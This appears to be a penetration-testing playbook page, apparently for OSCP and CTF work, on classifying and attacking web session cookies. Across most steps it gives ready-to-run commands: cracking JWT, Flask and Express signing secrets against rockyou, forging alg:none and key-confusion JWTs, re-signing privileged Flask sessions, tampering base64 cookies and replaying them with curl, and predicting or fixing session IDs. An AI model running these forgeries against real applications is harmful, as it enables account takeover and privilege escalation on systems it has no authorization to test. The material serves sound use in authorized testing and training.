
> **STATUS: AUDITED** — first-principles + primary-source rebuild 2026-09-22 (OWASP WSTG Session Management Schema; flask-unsign, jwt_tool, express-session/cookie-session docs). Classifier decode mechanics sandbox-tested; crack/forge tool flags doc-verified. Live-validation on ≥1 real target pending; Express/Rails HMAC-crack formatting flagged candidate. Not yet CANONICAL.

**Pivot that governs every branch:** does the cookie *carry the session data* (client-side — you can tamper or forge it) or is it a *signed/opaque pointer to server-side state* (you cannot forge data — only break integrity or fix/predict the handle)? Step 1's decode-to-confirm answers this per cookie. No cookie is dismissed as "opaque" until it has failed every test below.

---

## Step 1 — Classify the cookie value

Capture cookies if not already held:

`curl -s -D - -o /dev/null "http://<host>:<port>/" | grep -i '^Set-Cookie:'`

Per cookie, set `<value>` = its value. 

URL-decode once: 

`val=$(python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" '<value>'); printf '%s\n' "$val"`

Define the segment-decoder helper function (base64url/base64, padding-safe):

`seg(){ python3 -c "import base64,sys; s=sys.argv[1].split('.')[0].lstrip('.'); print(base64.urlsafe_b64decode(s+'='*(-len(s)%4)).decode('latin-1','replace'))" "$1"; }`

Walk these on `echo $val`, **first match wins**:

1. Three `.` separated base64url segments **AND** `seg "$val"` prints a header containing `"alg"` → **JWT** → Step 2.
2. Three `.` separated segments, but `$val` starts with `.` **OR** `seg "$val"` prints a readable session dict **without** `"alg"` → **Flask signed session (data in cookie)** → Step 3.
3. `$val` starts `s:` in the form `s:<id>.<base64sig>` → **Express `express-session` (signed pointer; data server-side)** → Step 4.
4. `$val` contains `--` (`<base64>--<hex|base64 sig>`) → **Rails signed** → `seg "$val"` the base64 half: readable data → treat as Step 3 (crack `secret_key_base`, forge); opaque id → treat as Step 4.
5. `echo -n "$val" | base64 -d` is JSON with `iv` **and** `mac` keys → **Laravel (encrypted)** → Step 5.
6. `$val` as-is, or after `base64 -d` / `seg`, is readable KV or JSON (e.g. `admin=false`, `{"id":1,"admin":false}`) → **client-side plain/encoded data** → Step 6.
7. `$val` is hex 32/40/64 chars, or starts `$…$` → **hash** → [[Cracking Hashes]]; on crack, treat the plaintext as the value and re-enter Step 1.
8. `$val` is otherwise encoded/binary with no recognised structure → delegate → [[Identify Data Blob]]; on decode, re-enter Step 1 on the result.
9. None of the above — long, random, no structure → **server-issued opaque handle** → Step 7.

---

## Step 2 — JWT (data in the token, signed)

`jwt=<value>`

1. Read claims — header `seg "$jwt"`, payload `python3 -c "import base64,sys; s=sys.argv[1].split('.')[1]; print(base64.urlsafe_b64decode(s+'='*(-len(s)%4)).decode())" "$jwt"`. Note privilege claims (`role`, `admin`, `user`, `sub`).
2. Scan: `python3 /opt/jwt_tool/jwt_tool.py "$jwt"`
3. **alg:none** (server trusts an unsigned token): `python3 /opt/jwt_tool/jwt_tool.py "$jwt" -X a` → tamper claims, replay unsigned.
4. **Weak HMAC secret**: `python3 /opt/jwt_tool/jwt_tool.py "$jwt" -C -d /usr/share/wordlists/rockyou.txt`
   - On crack → forge: `python3 /opt/jwt_tool/jwt_tool.py "$jwt" -T -S hs256 -p '<secret>'` (tamper claims interactively, re-sign).
   - Higher throughput alternative: `hashcat -m 16500 "$jwt" /usr/share/wordlists/rockyou.txt` ⚠️ confirm mode `16500` on Kali.
5. **RS256→HS256 key confusion** (server verifies HS256 with the RSA *public* key as the secret): obtain the public key, then `python3 /opt/jwt_tool/jwt_tool.py "$jwt" -X k -pk <public.pem>`.
6. Deeper (`kid` injection, `jku`/`x5u` SSRF, JWKS spoof) → [[JWT Attacks]].

**Verify:** replay the forged token in the `Cookie` header (or `Authorization: Bearer`); a privileged action succeeding = win. No secret cracked and no alg/confusion flaw → JWT integrity holds, log INAPPLICABLE.

---

## Step 3 — Flask signed session (data in the cookie)

1. Decode: `flask-unsign --decode --cookie '<value>'` → read the session dict.
2. Crack the secret: `flask-unsign --unsign --cookie '<value>' --wordlist /usr/share/wordlists/rockyou.txt`
3. On crack → forge the privileged session: `flask-unsign --sign --cookie "{'logged_in': True, 'admin': True}" --secret '<secret>'` (append `--legacy` for old `itsdangerous`).
4. **Verify:** replay the forged cookie against a privileged path.

No secret found (strong/random key) → forge is out; log INAPPLICABLE for this vector.

---

## Step 4 — Express `express-session` (`s:<sid>.<sig>` — signed pointer)

Session data lives **server-side**, keyed by `<sid>`; the cookie is only `s:<sid>.<base64 HMAC-SHA256(sid, secret)>`. Nothing in the cookie is tamperable for privilege — a re-signed arbitrary sid is a fresh empty session. The one cookie-specific check is whether the signing `secret` is weak.

Split the value (`$val` from Step 1) and build the crack hash (hashcat mode 1450 = HMAC-SHA256, key = password):

`sid=${val#s:}; sid=${sid%.*}; sig=${val##*.}; sighex=$(python3 -c "import base64,binascii,sys;s=sys.argv[1];print(binascii.hexlify(base64.b64decode(s+'='*(-len(s)%4))).decode())" "$sig"); echo "$sighex:$sid" > es_hash.txt`

`hashcat -m 1450 es_hash.txt /usr/share/wordlists/rockyou.txt`

Route on outcome:

- **Cracked** → weak `secret` (a finding). You can now validly sign a cookie for any `<sid>` → feeds session fixation (Step 7). Not direct privilege — a forged sid is an empty server-side session unless combined with fixation or an already-known privileged sid.
- **Not cracked** → secret is strong; cookie integrity holds; no client-side surface remains → Step 7 (fixation-acceptance test + prediction), then return to caller.

**Sibling — Express `cookie-session` (different middleware, data *in* the cookie):** two cookies `session=<base64 json>` + `session.sig=<hmac>`. Client-side data → decode/tamper the `session` JSON and re-forge as in Step 3; the `session.sig` is a `keygrip` HMAC over the `session=<value>` string — confirm its hash algorithm (SHA1/SHA256) before selecting the hashcat mode.

---

## Step 5 — Laravel (`{"iv","value","mac"}` — encrypted)

The cookie base64-decodes to an AES-256 blob keyed by the app's `APP_KEY`. You do not crack this — you **leak `APP_KEY`** (exposed `.env`, Debug/Ignition pages, `git` config) via [[Local File Inclusion]] / [[Config Files]]. With `APP_KEY` in hand, decrypt/forge the cookie, and where the decrypted payload is a serialized object → [[Insecure Deserialisation]]. No `APP_KEY` → log INAPPLICABLE.

---

## Step 6 — Plain / encoded client-side data (tamper)

The value (raw, or after `base64 -d` / `seg`) is readable data you can edit.

1. Identify the security-relevant field(s): `admin`, `is_admin`, `role`, `logged_in`, `user_id`, `uid`.
2. Edit to the privileged value and re-encode in the **same** encoding:
   - base64: `echo -n '{"id":1,"admin":true}' | base64 -w0`
   - base64url (no padding): `python3 -c "import base64,sys;print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" '{"id":1,"admin":true}'`
   - plain: edit inline.
3. Replay: `curl -s -b '<name>=<forged>' "http://<host>:<port>/<privileged_path>"` → privileged content = win.

Sequential/predictable value (`user_id=1000`, incrementing int) → also [[IDOR]].

---

## Step 7 — Server-issued opaque handle (no client-side data surface)

No structure, no decode, no crack. Two remaining vectors — mind their applicability:

1. **Session prediction** (solo-viable, no victim). Collect several fresh handles: `for i in $(seq 5); do curl -s -D - -o /dev/null "http://<host>:<port>/" | grep -i '^Set-Cookie:'; done`. Sequential, low-entropy, or timestamp-seeded → predict/brute an active session id and replay it. Needs an active session to exist.
2. **Session fixation** ⚠️ **victim-dependent** — needs a *separate privileged user* to authenticate a session id you planted (crafted `?sessionid=` link / [[XSS]] / header injection). No victim or admin-bot → not exploitable: **INAPPLICABLE on OSCP+ (solo) and most CTF; a real-engagement finding.** Only if a second user/admin-bot exists: set a known value pre-auth; if it survives their login, it's fixable.

Neither viable (opaque + strong + unpredictable, or no victim) → **INAPPLICABLE** — the cookie's client-side attack surface is exhausted. Log and return to caller; the app's real vector is elsewhere.

---

## Cookie attributes (context check)

`curl -s -D - -o /dev/null "http://<host>:<port>/" | grep -i '^Set-Cookie:'`

- Missing `HttpOnly` → cookie is stealable via [[XSS]] (pairs with any opaque-handle finding).
- Missing `Secure` → interceptable over plaintext HTTP.
- `SameSite=None` or absent → raises [[CSRF]] relevance.

---

## Decision

- Cookie tampered / forged / cracked / fixed into privileged access → **foothold or account takeover achieved** — proceed per caller (foothold → PrivEsc; authed → continue [[Authenticated Walk]]).
- Every class exhausted, cookie opaque + server-side + strong-secret → log **INAPPLICABLE**, return to caller.

---

## Validation

<!-- platform:box:section — add on first live sign-off; absence = unvalidated -->
